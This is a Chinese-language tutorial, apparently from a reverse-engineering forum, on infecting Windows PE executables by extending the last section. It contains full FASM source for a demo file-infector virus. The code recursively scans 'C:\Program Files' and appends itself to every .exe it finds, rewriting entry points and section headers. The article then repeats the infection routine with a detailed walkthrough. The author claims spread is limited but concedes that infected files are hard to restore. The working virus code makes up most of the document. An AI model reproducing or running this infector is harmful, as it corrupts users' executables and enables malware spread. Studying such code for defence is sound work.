

# 扩展节形式感染

> 原文：[`www.pediy.com/kssd/pediy10/83646.html`](https://www.pediy.com/kssd/pediy10/83646.html)

  
首先以一段 Demo 病毒代码来开端。下面以文章的形式来剖析感染过程。希望结交更多的 Virus 研究的看官。 o(∩\_∩)o...  
  

代码:

```

;============================================================================
;
; WIN32.FUNCKHACKER - WRITTEN BY XFISH
; (c)2009-03
;
;============================================================================
;
; DESCRIPCION
; ===========
; 
;   病毒代码采用 PEB 获得 kernel32 基地址，然后通过 hash 搜索填充 api 函数(这里 Thanks ...    coban2k,Anskya), 病毒整体可
;移植到任何的宿主中,这也就是和网络上目前那些通过静态注入(感染)部分 shellcode 的区别... 此病毒代码没有加入病毒更多的
;技术，例如 epo, 多态等。但是代码我认为却是比较精炼，尤其是 Get\_Apis 过程，填充 api 方便  快捷 o(∩\_∩)o...
;
;  此病毒代码仅仅是为了作为技术研究而使用,所以我限制了传播，在程序中，我做了仅是 Loader 调用 -
;感染过程，感染过程我仅仅感染 Program Files 目录的所有 exe 文件程序代码在宿主中仅仅调用消息框提示给用户.....虽然说
;限制了传播，但是感染后要恢复的话，也不是很容易,所以谨慎使用.....
;==============================================================================

  format PE GUI 4.0
   include 'win32ax.inc'
   
   entry  Virus\_Entry
   
.text
  ;--------------------------
  Virus\_Flag equ 'FISH'
  ;--------------------------
  
 Virus\_Entry:
   pushad
   pushfd
   
   call  Dels
 Dels:  
   pop  ebp
   sub  ebp, Dels
   ;-------------------------
   ;填充 Api 函数地址
   ;-------------------------
   call  GetKrnl32
   lea  edi, \[ebp + dwFuncs\]
   call  Get\_Apis
   @pushsz  'user32'
   call  \[ebp + \_LoadLibraryA\]
   call  Get\_Apis
  ;--------------------------------
  ;为了没有危害性，程序判断了在宿主中
  ;不开启感染函数，这样也就无法通过宿主
  ;来进行传播,宿主仅调用提提示函数 感染
  ;仅在 Loader 中开启.... o(∩\_∩)o...
  ;-------------------------------
   mov  eax, \[fs:30h\]
   mov  eax, \[eax+08h\]
   cmp  dword \[eax+2\], Virus\_Flag
   jne  .Loader
   ;-----------------------------------
   ;消息框警告用户已经中毒
   ;----------------------------------
   sub  edx, edx
   push  30h
   lea  eax, \[ebp + szTitle\]
   push  eax
   lea  eax, \[ebp + szText\]
   push  eax
   push  edx
   call  \[ebp + \_MessageBoxA\]
   ;---------------------------------------
   popfd
   add  esp, 4\*8
   lea  eax, \[ebp + Jmp\_Host\]
   jmp  eax
   
  .Loader:
    ;-------------------------
   ;Loader 感染过程
   ;-------------------------
   mov  edx, ebp
   push  '.exe'
   @pushsz  'C:\\Program Files'
   call  Inject\_Disk
   
   popfd
   popad
   ret
   
 ;(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
 
    
 ;---------------------------------------------
 ; 获得 kernel32 基地址
 ; input: nothing
 ;---------------------------------------------
 GetKrnl32:
        mov     eax, \[fs:30h\] 
        irp    offset, 0ch,1ch,00h,08h {mov eax, \[eax+offset\]} 
        ret 
 ;---------------------------------------------------
 ;获取并填充 api 函数地址
 ;input : eax =  Krnl32Base , edi = HashFuncAddress
 ;thanks coban2k,Anskya
 ;---------------------------------------------------
 Get\_Apis:
   pushad
  xchg   eax, ebx
  mov    eax, \[ebx+03ch\]
  mov    esi, \[eax+ebx+78h\]  ; Get Export Rva
  lea    esi, \[esi+ebx+18h\]   ; get Export NumberOfFunctions
  
  cld
  lodsd        ; NumberOfFunctions  
  xchg   eax, ecx
  lodsd        ; AddressOfFunctions
  push   eax
  lodsd        ; AddressOfNames
  add    eax, ebx
  xchg   eax, edx
  lodsd        ; AddressOfNameOrdinals
  add    eax, ebx
  xchg   eax, ebp
  xchg   edx, esi
  
 .Next\_Func:
  lodsd
  add    eax, ebx
  xor    edx, edx
  
 .Calc\_Hash:  
  rol    edx, 3
  xor    dl, byte \[eax\]
  inc   eax
  cmp   byte \[eax\], 0
  jnz    .Calc\_Hash
  
  push   edi
  
 .Scan\_dw\_Funcs:
  cmp    \[edi\], edx
  jnz    .Skip\_Function
  
  movzx  eax, word \[ebp\]
  shl    eax, 2
  add    eax, \[esp+4\]
  mov    eax, \[eax+ebx\]
  add    eax, ebx
  scasd
  stosd
  
 .Skip\_Function:
  scasd
  add  edi, 4
  sub    eax, eax
  cmp    dword \[edi\], eax
  jne    .Scan\_dw\_Funcs
  
  pop    edi
  add    ebp, 2
  loop  .Next\_Func
  pop    ecx
  
  popad
  ret
  
 ;-------------------------------------------
 ; 感染磁盘函数
 ; input: edx = dels(重定位偏移差) 
 ;-------------------------------------------
 proc  Inject\_Disk lpszDirectory, dwFileType
    locals
      @hFindFile  rd  1
      @stWfd    WIN32\_FIND\_DATA
      @szSearch  rb  260
    endl
   pushad
   mov  ebx, edx
   lea  esi, \[@szSearch\]
   push  \[lpszDirectory\]
   push  esi
   call  \[ebx + \_lstrcpyA\]
   ;---------------------------------------
   ;esi = @szSearch
   ;copy 文件路径到 esi
   ;---------------------------------------
   @pushsz  '\\\*.\*'
   push  esi
   call  \[ebx + \_lstrcatA\]
   lea  edi, \[@stWfd\]
   ;----------------------------------------
   ;esi + '\\\*.\*', edi = ptr WIN32\_FIND\_DATA
   ;---------------------------------------
   push  edi
   push  esi
   call  \[ebx + \_FindFirstFileA\]
  inc  eax
  jz  .Ret
  dec  eax
  mov  \[@hFindFile\], eax
  .repeat
    pushad
      mov  edi, esi
      xor  eax, eax
      mov  ecx, 260
      rep  movsb
    popad
    ;------------------------------
    cmp  byte \[edi+WIN32\_FIND\_DATA.cFileName\], '.'
    je  .FindNext
    ;------------------------------
    push  \[lpszDirectory\]
    push  esi
    call  \[ebx + \_lstrcpyA\]
  
    @pushsz  '\\'
    push  esi
    call  \[ebx + \_lstrcatA\]
    
    lea  edx, \[edi+WIN32\_FIND\_DATA.cFileName\]
    push  edx
    push  esi
    call  \[ebx + \_lstrcatA\]
    ;------------------------------
    mov   eax, \[edi+WIN32\_FIND\_DATA.dwFileAttributes\]
    and  eax, FILE\_ATTRIBUTE\_DIRECTORY
    .if  eax = FILE\_ATTRIBUTE\_DIRECTORY
      mov  edx, ebx
      push  \[dwFileType\]
      push  esi
      call  Inject\_Disk
        jmp  .FindNext
      .endif
    ;-----------------------------
    ; 转换小写
    ;-----------------------------
      push  esi
      call  StrLwr
      
      push  esi
      call  \[ebx + \_lstrlenA\]
      
      mov  edx, \[dwFileType\]
      cmp  dword \[esi+eax-4\], edx
      jne  .FindNext
      ;-----------------------------
      ; 进行感染工作
      ;-----------------------------
      mov  eax, esi
      call  Inject\_File
      
   .FindNext:
     push  edi
     push  \[@hFindFile\]
     call  \[ebx + \_FindNextFileA\]
  .until  eax = 0
  
  push  \[@hFindFile\]
  call  \[ebx + \_FindClose\]
 .Ret:
   popad
   ret
 endp
 
 ;----------------------------------------
 ; 字符串转换小写函数
 ;----------------------------------------
 proc  StrLwr  uses esi edi, pString
  mov  esi, \[pString\]
  mov  edi, esi
  @@:
  lodsb
  test  al, al
  je  @f
  .if  al >= 'A' & al <= 'Z'
    or  al, 20h
    stosb
    jmp  @b
  .endif
  stosb
  jmp  @b
  @@:
  ret
 endp  
    
 ;---------------------------------------
 ;input: eax - 对齐的值, ecx - 对齐因子
 ;
 ;Ouput: eax - 对齐值
 ;---------------------------------------
 Align\_Size:  
   pushad
  xor  edx, edx
  push  eax
  div  ecx
  pop  eax
  sub  ecx, edx
  add  eax, ecx
  mov  \[esp+4\*7\], eax
  popad
  ret
  
 ;--------------------------------------
 ;感染过程
 ;input: eax - 文件路径
 ;
 ;OuPut: nothing
 ;---------------------------------------
 Inject\_File:
   pushad
   sub  edx, edx
   
   ;---------------------------------
   ;mov  ebp, ebx ....  ebp = dels
   ;---------------------------------
   mov  ebp, ebx
   push  edx
   push  edx
   push  OPEN\_EXISTING
   push  edx
   push  FILE\_SHARE\_READ
   push  GENERIC\_WRITE or GENERIC\_READ
   push  eax
   call  \[ebp + \_CreateFileA\]
   inc  eax
   jz  .Open\_Faild
   dec  eax
   xchg  eax, ebx
   ;---------------------
   ;ebx - 文件句柄
   ;---------------------
   
   xor  edx, edx
   push  edx
   push  edx
   push  edx
   push  PAGE\_READWRITE
   push  edx
   push  ebx
   call  \[ebp + \_CreateFileMappingA\]
   test  eax, eax
   jz  .OpenMap\_Faild
   xchg  eax, esi
   ;-----------------------
   ;esi - 文件映射句柄
   ;-----------------------
   
   sub  edx, edx
   push  edx
   push  edx
   push  edx
   push  FILE\_MAP\_WRITE
   push  esi
   call  \[ebp + \_MapViewOfFile\]
   test  eax, eax
   jz  .MapFile\_Faild
   xchg  eax, edi
   ;-----------------------
   ;edi - 文件映射内存偏移
   ;-----------------------
   
   cmp  word \[edi\], 'MZ'
   jnz  .Ret
   cmp  dword \[edi+2\], Virus\_Flag
  jz  .Ret
  
  push  0
  push  ebx
  call  \[ebp + \_GetFileSize\]
  
  add  eax, Virus\_Size
  mov  edx, \[edi+3ch\]
  add  edx, edi
  push  dword \[edx+3ch\]
  pop  ecx
  call  Align\_Size
  ;-----------------------
  ;eax - 文件对齐大小
  ;-----------------------
  pushad
  push  edi
  call  \[ebp + \_UnmapViewOfFile\]
  push  esi
  call  \[ebp + \_CloseHandle\]
  popad
  
  push  eax
  xor  edx, edx
   push  edx
   push  eax  
   push  edx
   push  PAGE\_READWRITE
   push  edx
   push  ebx
   call  \[ebp + \_CreateFileMappingA\]
   pop  ecx
   or  eax, eax
   jz  .OpenMap\_Faild
   xchg  eax, esi
   ;-----------------------
   ;esi - 文件映射句柄
   ;ecx - 文件对齐大小
   ;-----------------------
   
  sub  edx, edx
   push  ecx
   push  edx
   push  edx
   push  FILE\_MAP\_WRITE
   push  esi
   call  \[ebp + \_MapViewOfFile\]
   test  eax, eax
   jz  .MapFile\_Faild
   xchg  eax, edi
   ;-----------------------
   ;edi - 文件映射内存偏移
   ;-----------------------
 
   mov  edx, \[edi+3ch\]
   cmp  word \[edx+edi\], 'PE'
   jnz  .Ret
   
   ;-----------------------
   ;edx - PE 头结构偏移
   ;ecx - 节表数量-1 的大小
   ;eax - 数据目录段大小
   ;-----------------------
   add  edx, edi
   movzx  ecx, word \[edx+06h\]
   dec  ecx
   imul  ecx, ecx, 28h
   mov  eax, \[edx+74h\]
   shl  eax, 3
 
   ;-------------------------
   ;edx - 指向末尾节表位置
   ;-------------------------
   add  edx, 78h
   add  edx, ecx
   add  edx, eax
   
   ;----------------------------------------
   ;ecx = SizeOfRawData + pointerToRawData
   ;----------------------------------------
   mov  ecx, \[edx+14h\]
   add  ecx, \[edx+10h\]
   push  ecx
   
   ;---------------------------------------
   ;New oep = SizeOfRawData +　virtual address
   ;    eax = \[edx+10h\]　   +　\[edx+0ch\]
   ;---------------------------------------
   mov  eax, \[edx+10h\]
   add  eax, \[edx+0ch\]
   
   ;---------------------------------------
   ;  计算 jmp 相对偏移值，然后写入
   ;---------------------------------------
   mov  ecx, \[edi+3ch\]
   pushad
   xchg  eax, edx
   add  edx, Jmp\_Size
   mov  eax, \[ecx+edi+28h\]
   sub  eax, edx
   mov  \[ebp + Jmp\_Addr\], eax
   popad
   
   ;-----------------------------------
   ;\[ecx+edi+28h\] = AddressOfEntryPoint
   ;-----------------------------------
   mov  \[ecx+edi+28h\], eax
   
   ;-----------------------------
   ;\[edx+10h\] - SizeOfRawData
   ;\[ecx+edi+3ch\] - File Aligment
   ;----------------------------
   mov  eax, \[edx+10h\]
   add  eax, Virus\_Size
   mov  ecx, \[edi+3ch\]
   mov  ecx, \[ecx+edi+3ch\]
   call  Align\_Size
   
   ;-----------------------------
   ;\[edx+10h\] - SizeOfRawData
   ;\[edx+08h\] - VirtualSize
   ;\[ecx+edi+50h\] - SizeOfImage
   ;0A0000020h - 可读可写可执行的节属性
   ;------------------------------
   mov  \[edx+10h\], eax
   mov  \[edx+08h\], eax
   
   ;-----------eax + virtual address--------
   add  eax, \[edx+0ch\]
   mov  ecx, \[edi+3ch\]
   mov  \[ecx+edi+50h\], eax
   or  dword \[edx+24h\], 0A0000020h
   mov  dword \[edi+2\], Virus\_Flag
   
   pop  eax ;取出临时存储
   
   ;-----------------------------------
   pushad
   xchg  eax, esi
   add  esi, edi
   xchg  esi, edi
   
   lea  esi, \[ebp + Virus\_Entry\]
   mov  ecx, Virus\_Size
   rep  movsb
   popad
 .Ret:
   push  edi
   call  \[ebp + \_UnmapViewOfFile\]
 .MapFile\_Faild:
   push  esi
   call  \[ebp + \_CloseHandle\]  
 .OpenMap\_Faild:
   push  ebx
   call  \[ebp + \_CloseHandle\]
 .Open\_Faild:
   popad
   ret
   
  ; ----------------------------------------------   
  ;  Jmp  HostAddress
  Jmp\_Host:
   jmp  12345678
    Jmp\_Addr = $ - 4
    Jmp\_Size = $ - Virus\_Entry
  ; ----------------------------------------------


 ;--------------------------------------------------------------
   szText    db  'Win32 PE Virus Demo, The Worm Name Is FuckHacker o(∩\_∩)o.........', 0
   szTitle    db  'Win32 PE Virus Demo', 0
 
 dwFuncs:
   RolHash    \_lstrcpyA, 'lstrcpyA'
   RolHash    \_lstrcatA, 'lstrcatA'
   RolHash   \_lstrlenA, 'lstrlenA'
   ;RolHash  \_CreateThread, 'CreateThread'
   ;RolHash  \_CreateEventA, 'CreateEventA'
   ;RolHash  \_GetLastError, 'GetLastError'
   ;RolHash  \_ExitThread, 'ExitThread'
   RolHash    \_FindFirstFileA, 'FindFirstFileA'
   RolHash   \_FindNextFileA, 'FindNextFileA'
   RolHash    \_FindClose, 'FindClose'
   RolHash    \_CreateFileA, 'CreateFileA'
   RolHash   \_WriteFile, 'WriteFile'
   RolHash   \_ReadFile, 'ReadFile'
   RolHash    \_GetFileSize, 'GetFileSize'
   RolHash   \_CloseHandle, 'CloseHandle'
    RolHash   \_LoadLibraryA, 'LoadLibraryA'
    RolHash   \_GetProcAddress, 'GetProcAddress'
    RolHash     \_MapViewOfFile, 'MapViewOfFile'
    RolHash    \_CreateFileMappingA, 'CreateFileMappingA'
    RolHash   \_UnmapViewOfFile, 'UnmapViewOfFile'
    RolHash   \_MessageBoxA, 'MessageBoxA'
    rd    4
  ;----------------------------------------------------------

 Virus\_Size = $ - Virus\_Entry

```

文章 Begin:  
  
   大家再看到这篇文章的标题时应该会对“美妙”一词感到疑惑，怎么我会以美妙来修饰。大家不必惊讶，没错，它的确是美妙的，因为在这里你可以施展自己的扩展性思维，让你的代码发展的淋漓尽致，还有比这个更美妙的吗？  
  
   至于病毒编写需要的一些前置知识，今天这篇文章我就不想过多讲解了。例如 PE 结构的知识、重定位、Hash 搜索 API 函数地址等。如果哪位朋友觉得自己不具备上面说的这些基础知识，那最好还是补习下。  
  
  首先我们都知道，我们的 win32 可执行文件格式就是 PE 文件结构，那么我们感染对象也就是 PE 文件结构。所以我这里至少认为你对 PE 文件结构已经是很熟悉了。好，继续，今天我们的感染方式是扩展末尾节，因为它很简单、稳定、快捷。那么扩展末尾节顾名思义就是针对被感染对象的最后一个节的扩展。将尾部节的大小扩充，然后将我们的病毒代码 Write 进去，修改若干的 PE 结构成员。 知道这些，你肯定会问修改哪些若干成员，为了给大家更直白的感觉，下面我列出了感染中需要修改的结构成员。  
  
1.  SizeOfImage        50h  
2.  SizeOfRawData      10h  
3.  VirtualSize        08h  
4.  Characteristics        24h  
5.  AddressOfEntryPoint    28h  
6.  e\_cblp + e\_cp         02h    ;4 字节感染标记，利用你的创造性，来吧。  
  
后面给出的数值则是这些成员相对于结构的偏移。这是为了我们后面的写 Raw 代码时候的方便。呼呼。  
  
那么接下来大家来看下我们的感染过程。  
代码:

```
;--------------------------------------
 ;感染过程
 ;input: eax - 文件路径
 ;
 ;OuPut: nothing
 ;---------------------------------------
 Inject\_File:
   pushad
   sub  edx, edx
   
   ;---------------------------------
   ;mov  ebp, ebx ....  ebp = dels
   ;---------------------------------
   mov  ebp, ebx
   push  edx
   push  edx
   push  OPEN\_EXISTING
   push  edx
   push  FILE\_SHARE\_READ
   push  GENERIC\_WRITE or GENERIC\_READ
   push  eax
   call  \[ebp + \_CreateFileA\]
   inc  eax
   jz  .Open\_Faild
   dec  eax
   xchg   eax, ebx
   ;---------------------
   ;ebx - 文件句柄
   ;---------------------
   
   xor  edx, edx
   push  edx
   push  edx
   push  edx
   push  PAGE\_READWRITE
   push  edx
   push  ebx
   call  \[ebp + \_CreateFileMappingA\]
   test  eax, eax
   jz  .OpenMap\_Faild
   xchg  eax, esi
   ;-----------------------
   ;esi - 文件映射句柄
   ;-----------------------
   
   sub  edx, edx
   push  edx
   push  edx
   push  edx
   push  FILE\_MAP\_WRITE
   push  esi
   call  \[ebp + \_MapViewOfFile\]
   test  eax, eax
   jz  .MapFile\_Faild
   xchg  eax, edi
   ;-----------------------
   ;edi - 文件映射内存偏移
   ;-----------------------
   
   cmp  word \[edi\], 'MZ'
   jnz  .Ret
   cmp  dword \[edi+2\], Virus\_Flag
  jz  .Ret
  
  push  0
  push  ebx
  call  \[ebp + \_GetFileSize\]
  
  add  eax, Virus\_Size
  mov  edx, \[edi+3ch\]
  add  edx, edi
  push  dword \[edx+3ch\]
  pop  ecx
  call  Align\_Size
  ;-----------------------
  ;eax - 文件对齐大小
  ;-----------------------
  pushad
  push  edi
  call  \[ebp + \_UnmapViewOfFile\]
  push  esi
  call  \[ebp + \_CloseHandle\]
  popad
  
  push  eax
  xor  edx, edx
   push  edx
   push  eax  
   push  edx
   push  PAGE\_READWRITE
   push  edx
   push  ebx
   call  \[ebp + \_CreateFileMappingA\]
   pop  ecx
   or  eax, eax
   jz  .OpenMap\_Faild
   xchg  eax, esi
   ;-----------------------
   ;esi - 文件映射句柄
   ;ecx - 文件对齐大小
   ;-----------------------
   
  sub  edx, edx
   push  ecx
   push  edx
   push  edx
   push  FILE\_MAP\_WRITE
   push  esi
   call  \[ebp + \_MapViewOfFile\]
   test  eax, eax
   jz  .MapFile\_Faild
   xchg  eax, edi
   ;-----------------------
   ;edi - 文件映射内存偏移
   ;-----------------------
 
   mov  edx, \[edi+3ch\]
   cmp  word \[edx+edi\], 'PE'
   jnz  .Ret
   
   ;-----------------------
   ;edx - PE 头结构偏移
   ;ecx - 节表数量-1 的大小
   ;eax - 数据目录段大小
   ;-----------------------
   add  edx, edi
   movzx  ecx, word \[edx+06h\]
   dec  ecx
   imul  ecx, ecx, 28h
   mov  eax, \[edx+74h\]
   shl  eax, 3 

   ;-------------------------
   ;edx - 指向末尾节表位置
   ;-------------------------
   add  edx, 78h
   add  edx, ecx
   add  edx, eax

   ;----------------------------------------
   ;ecx = SizeOfRawData + pointerToRawData
   ;----------------------------------------
   mov  ecx, \[edx+14h\]
   add  ecx, \[edx+10h\]
   push  ecx
   
   ;---------------------------------------
   ;New oep = SizeOfRawData +　virtual address
   ;    eax = \[edx+10h\]　   +　\[edx+0ch\]
   ;---------------------------------------
   mov  eax, \[edx+10h\]
   add  eax, \[edx+0ch\]
   
   ;---------------------------------------
   ;  计算 jmp 相对偏移值，然后写入
   ;---------------------------------------
   mov  ecx, \[edi+3ch\]
   pushad
   xchg  eax, edx
   add  edx, Jmp\_Size
   mov  eax, \[ecx+edi+28h\]
   sub  eax, edx
   mov  \[ebp + Jmp\_Addr\], eax
   popad
   
   ;-----------------------------------
   ;\[ecx+edi+28h\] = AddressOfEntryPoint
   ;-----------------------------------
   mov  \[ecx+edi+28h\], eax
   
   ;-----------------------------
   ;\[edx+10h\] - SizeOfRawData
   ;\[ecx+edi+3ch\] - File Aligment
   ;----------------------------
   mov  eax, \[edx+10h\]
   add  eax, Virus\_Size
   mov  ecx, \[edi+3ch\]
   mov  ecx, \[ecx+edi+3ch\]
   call  Align\_Size
   
   ;-----------------------------
   ;\[edx+10h\] - SizeOfRawData
   ;\[edx+08h\] - VirtualSize
   ;\[ecx+edi+50h\] - SizeOfImage
   ;0A0000020h - 可读可写的节属性
   ;------------------------------
   mov  \[edx+10h\], eax
   mov  \[edx+08h\], eax
   
   ;-----------eax + virtual address--------
   add  eax, \[edx+0ch\]
   mov  ecx, \[edi+3ch\]
   mov  \[ecx+edi+50h\], eax
   or  dword \[edx+24h\], 0A0000020h
   mov  dword \[edi+2\], Virus\_Flag
   
   pop  eax ;取出临时存储
   
   ;-----------------------------------
   pushad
   xchg  eax, esi
   add  esi, edi
   xchg  esi, edi
   
   lea  esi, \[ebp + Virus\_Entry\]
   mov  ecx, Virus\_Size
   rep  movsb
   popad
 .Ret:
   push  edi
   call  \[ebp + \_UnmapViewOfFile\]
 .MapFile\_Faild:
   push  esi
   call  \[ebp + \_CloseHandle\]  
 .OpenMap\_Faild:
   push  ebx
   call  \[ebp + \_CloseHandle\]
 .Open\_Faild:
   popad
   ret
   
  ; ----------------------------------------------   
  ;  Jmp  HostAddress
  Jmp\_Host:
   jmp  12345678
    Jmp\_Addr = $ - 4
    Jmp\_Size = $ - Virus\_Entry
  ; ----------------------------------------------

```

好了，接下来我们就来分析我们的感染函数吧，由于我的这个感染过程是在我的感染磁盘函数中调用的, 感染磁盘函数中我声明了局部变量，更由于我的重定位偏移差是存在 ebp 寄存器的，所以在感染磁盘函数我不得以使用了 ebx 来存储重定位偏移差，所以这个函数的第一句汇编指令也就是将 ebx 的值赋给 ebp。我想大家应该都看到了, 感染过程中我们使用的是 ebp 来作为重定位偏移差。首先程序调用 CreateFile 打开我们的被感染目标，然后通过创建文件映射对象，调用 MapViewOfFile 将文件映射到内存中。然后判断是否是 PE 文件格式以及是否被感染，程序此时获得被感染文件大小 + 病毒大小，读取文件对齐值，调用我们的对齐函数获得我们对齐后的文件大小。这里为什么要获得文件对齐后的大小呢，由于的文件各个节表的大小在磁盘中都是基于我们的文件对齐值的，这也是为何我们平常做免杀的时候能有地方能写入我们的汇编指令以及为何我们的一些病毒采用搜索空隙插入数据的原因，所以我们必须调用 Align\_Size 获得对齐文件大小，通过对齐后的大小来扩展（为什么？看前面那）。那么我们来看下 Align\_Size 这个过程，不要说你没有学过数学。  
;---------------------------------------  
 ;input: eax - 对齐的值, ecx - 对齐因子  
 ;  
 ;Ouput: eax - 对齐值  
 ;---------------------------------------  
 Align\_Size:    
   pushad  
  xor  edx, edx  
  push  eax  
  div  ecx  
  pop  eax  
  sub  ecx, edx  
  add  eax, ecx  
  mov  \[esp+4\*7\], eax  
  popad  
  ret  
;首先求我们对齐因子基于对齐值的余数，这样通过对齐因子减去余数，得到的值则是能被整除的。通过对齐的值+能被整除的值，则为对齐值。看看这个 Align 宏或许能对你有点启发。macro align value { rb (value-1)-($+value-1) mod value }。  
  
获得对齐文件大小后，我们 UnMap 掉映射文件，然后关闭文件映射对象。因为我们等下需要以指定的大小(也就是刚刚我们获得的对齐文件大小)来创建文件映射对象，这样就免得我们通过 SetEndOfFile 函数来增加我们的文件长度了。紧接着我们以指定的文件大小来创建文件映射对象并映射到内存。然后判断是否是 PE 文件，此时获得 PE Header 头结构的偏移(应该大部分地球人都知道如何获得吧)，由于我们要定位最后一个节表的偏移，所以此时我们要通过 PE Header 的偏移 + 78 来到数据目录段后再  + \[NumberOfRvaAndSizes\]\*8 + \[NumberOfSections - 1\]\* 28 。因为我们事先不知道对方的程序是否做过优化或者是否有几个数据目录结构。所以我们需要读取它的数量\*数据目录的结构大小来定位节表。那么+  \[NumberOfSections - 1\]\* 28 我想大家应该也知道了吧，因为我们要定位末尾节表偏移，所以+ \[节数量-1\]\*节表结构的字节大小。好了我们此时已经来到末尾节表的位置了。因为我们要将我们的病毒体整个写入到我们末尾节的尾部(这里的尾部指的是它代码后面),所以我们需要定位末尾节它代码大小后面的偏移。我们通过节表中的 SizeOfRawData + pointerToRawData 来定位 （不知道这两个成员是分别做什么用的吗？是文件在磁盘的物理偏移和大小）。好了，我们如果想要我们的程序从我们写入的偏移开始执行，我们需要修改被感染程序的 OEP，也就是 PE Header 结构的 AddressOfEntryPoint。但是我们需要注意的一点是这个成员是 RVA 地址，也就是映射到内存后基于基地址的偏移。所以我们需要以节表映射到内存的偏移 + 原始节在磁盘中的字节大小。 不用说肯定是节表的 SizeOfRawData +　virtual address 了。 OK，此时我们可以将两个成员相加后得到偏移写入到 AddressOfEntryPoint 成员了。。  
  
接下来我说下如何计算 jmp 到 oep 的相对偏移，因为我们都知道我们 jmp 到一个地址，实际上编译器编译后是写入的是我们 jmp 本身所处的地址基于要跳向地址的偏移，它是一个相对偏移，那么我们如何来计算这个相对偏移呢？我们新 Oep 偏移跳转到之前程序的 OEP，这肯定是一个 long 跳转也就是 5 字节的。如果我们仅仅是从低地址跳向高地址，那么直接通过高地址  低地址的偏移 -5 就可以了。 但是我们是高地址跳向低地址。所以我们通过低地址  高地址 得到补码后  5 则为我们高地址基于低地址的偏移。因为很懒的缘故吧，所以我通过新 OEP +5 字节后，在通过原 Oep  新 Oep。得到值则为新 Oep 相对原 Oep 的偏移。然后就可以将这个 4 字节值写入到我们 jmp 后面的偏移了。  
  
这时候我们计算我们新的 SizeOfRawData 成员值，这个值我就不想多说了吧。原 SizeOfRawData+病毒大小。然后调用 对齐函数，获得对齐后的大小写入进去。VirtualSize 是我们节映射到内存的大小，所以这个成员我们也直接写入对齐后的 SizeOfRawData 值就可以了。接下来就是我们的 SizeOfImage 成员 它是映像文件映射到内存的总大小，我们直接通过 SizeOfRawData + VirtualAddress 的大小来计算就可以了。     
  
好了，重要的成员我们都修改完成了，接下来就是我们的写入工作了。很简单，直接 rep movsb 就 OK 了。。  
  
好了到这里感染过程就基本上给大家解释完了。